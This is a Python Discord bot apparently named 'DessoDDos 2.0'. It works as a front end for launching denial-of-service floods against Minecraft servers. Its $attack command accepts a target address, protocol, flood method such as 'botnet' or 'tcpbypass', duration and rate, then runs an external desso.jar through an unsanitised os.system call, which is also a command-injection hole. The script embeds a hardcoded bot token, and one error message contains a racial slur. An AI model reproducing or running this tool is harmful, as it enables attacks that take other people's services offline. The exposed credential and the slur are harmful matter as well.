import discord
from discord.ext import commands
import os
import discord.utils

methods_list = [
    'join', 'charonbot', 'localhost', 'invalidnames', 'longnames',
    'botjoiner', 'spoof', 'ping', 'multikiller', 'handshake',
    'bighandshake', 'query', 'bigpacket', 'network', 'randombytes',
    'extremejoin', 'spamjoin', 'nettydowner', 'ram', 'yoonikscry',
    'colorcrasher', 'tcphit', 'botnet', 'tcpbypass',
    'ultimatesmasher', 'sf', 'nabcry','legitnamekiller'
]
protocols_list = [
    '759', '760', '761',
    '758', '757', '757', '756', '754', '753', '751', '736', '736', '735',
    '578', '575', '573', '498', '490', '485', '480', '477', '404', '401',
    '393', '340', '338', '335'
]
ddos_channel_id = 1123917398815293480
allowed_role_id = 1123698617010634844

desso = commands.Bot(command_prefix = ['$'], intents = discord.Intents.all())
desso.remove_command('help')

@desso.event
async def on_ready():
    channel_id = 1123915547743101029
    channel = desso.get_channel(channel_id)
    await channel.send('Бот онлайн')
    activity = discord.Streaming(
        name="☀️DessoDDos 2.0☀️",
        url="https://www.twitch.tv/directory/game/minecraft") 
    await desso.change_presence(status=discord.Status.idle, activity=activity)
    print('||| DessoDDos 2.0 |||')

@desso.event
async def on_command_error(ctx, error):
    if isinstance(error, commands.CommandNotFound):
        em = discord.Embed(
            title=f"Ошибка.",
            description=f"**Команды нету!**",
            color=ctx.author.color)
        em.set_image(url=f'https://media.discordapp.net/attachments/1015249886129700898/1021690060174794752/image_processing20190818-32750-8v6g4s_1.gif')
        await ctx.send(embed=em)
    if isinstance(error, commands.MissingRequiredArgument):
        em = discord.Embed(title=f"Ошибка.",
                           description=f"**Команда отправлена неправильно!**",
                           color=ctx.author.color)
        em.set_image(url=f'https://media.discordapp.net/attachments/1015249886129700898/1021690060174794752/image_processing20190818-32750-8v6g4s_1.gif')
        await ctx.send(embed=em)

@desso.command()
async def help(ctx):
    embed = discord.Embed(title="☀️Меню помощи☀️", color=discord.Colour.random())
    embed.add_field(
        name='Запуск атаки',
        value='$attack <ip:port> <protocol> <method> <time> <cps>',
        inline=False)
    embed.add_field(name=' Узнать Айпи🌎 (В будущем)', value='$resolve', inline=False)
    embed.add_field(name=' Добавить сервер на мониторинги (В будущем)', value='$addm', inline=False)
    embed.add_field(name=' stop⚡️(В будущем)', value='$stop', inline=False)
    embed.set_footer(text='☀️Помощь☀️') ,
    await ctx.send(embed=embed)

@desso.command()
async def attack(ctx, arg1, arg2, arg3, arg4, arg5):

    creator_id = 1123698617010634844

    def attack():
        os.system(f"java -jar desso.jar {arg1} {arg2} {arg3} {arg4} {arg5}")

    is_creator = ctx.author.id == creator_id

    embed = discord.Embed(title='DessoDDos ',
                          description=f'Атакa By {ctx.author.mention}',
                          color=discord.Colour.blue())

    embed.add_field(name='🎉𝙄𝙋:', value=f'→``{arg1}``', inline=True)
    embed.add_field(name='🔥𝙋𝙧𝙤𝙩𝙤𝙘𝙤𝙡:', value=f'→``{arg2}``', inline=True)
    embed.add_field(name='⚡️𝙈𝙚𝙩𝙝𝙤𝙙:', value=f'→``{arg3}``', inline=True)
    embed.add_field(name='🌎𝙏𝙞𝙢𝙚:', value=f'→``{arg4}``', inline=True)

    if is_creator:
        embed.add_field(name='🌀Доступ:', value=f'→``Ｃｒｅａｔｏｒ``', inline=True)
    else:
        embed.add_field(name='🌀Доступ:', value=f'→``Ｆｒｅｅ``', inline=True)

    embed.add_field(name='🔒𝙎𝙥𝙚𝙚𝙙:', value=f'→``{arg5}``', inline=True)
    embed.set_image(
        url=
        f'https://c.tenor.com/2ASEP-BmFh0AAAAC/boom-world-explodes.gif'
    )
    embed.set_footer(text="𝔇𝔢𝔰𝔰𝔬𝔇𝔇𝔬𝔰")

    if str(arg2) not in protocols_list:
        em = discord.Embed(
            title=f"Ошибка.",
            description=
            f"**не правильный протокол! либо ты пингвин!**",
            color=ctx.author.color)
        em.set_image(url=f'https://media.discordapp.net/attachments/1015249886129700898/1021690060174794752/image_processing20190818-32750-8v6g4s_1.gif')
        await ctx.send(embed=em)
        return

    if arg3 not in methods_list:
        em = discord.Embed(title=f"Ошибка.",
                           description=f"**Метод не найден либо ты страус! - $methods**",
                           color=ctx.author.color)
        em.set_image(url=f'https://media.discordapp.net/attachments/1015249886129700898/1021690060174794752/image_processing20190818-32750-8v6g4s_1.gif')
        await ctx.send(embed=em)
        return

    if ctx.message.channel.id != ddos_channel_id:
        em = discord.Embed(
            title=f"Ошибка.",
            description=f"**не тот канал #🎯・ddos .**",
            color=ctx.author.color)
        em.set_image(url=f'https://media.discordapp.net/attachments/1015249886129700898/1021690060174794752/image_processing20190818-32750-8v6g4s_1.gif')
        await ctx.send(embed=em)
        return

    if int(arg4) > 60:
        em = discord.Embed(
            title=f"Ошибка.",
            description=
            f"**ты негр, используй от 1 - 60 секунд (новогодняя акция).**",
            color=ctx.author.color)
        em.set_image(url=f'https://media.discordapp.net/attachments/1015249886129700898/1021690060174794752/image_processing20190818-32750-8v6g4s_1.gif')
        await ctx.send(embed=em)
        return
  
    if is_creator and int(arg5) > 50000:
        em = discord.Embed(
            title=f"Ошибка.",
            description=f"**ты банан, используй от 1 - 50000.**",
            color=ctx.author.color)
        em.set_image(url=f'https://media.discordapp.net/attachments/1015249886129700898/1021690060174794752/image_processing20190818-32750-8v6g4s_1.gif')
        await ctx.send(embed=em)
        return

    elif not is_creator and int(arg5) > 15000:
        em = discord.Embed(
            title=f"Ошибка.",
            description=f"**ты банан, используй от 1 - 15000.**",
            color=ctx.author.color)
        em.set_image(url=f'https://media.discordapp.net/attachments/1015249886129700898/1021690060174794752/image_processing20190818-32750-8v6g4s_1.gif')
        await ctx.send(embed=em)
        return

    desso = threading.Thread(target=attack)

    desso.start()

    await ctx.send(embed=embed)

desso.run('MTEyMzkxNjE3OTUyNjkyNjM3Ng.GonG7h.-AWHeYGoW5ejQ22bcsamNyEsl1XbUd-x_GmpSQ')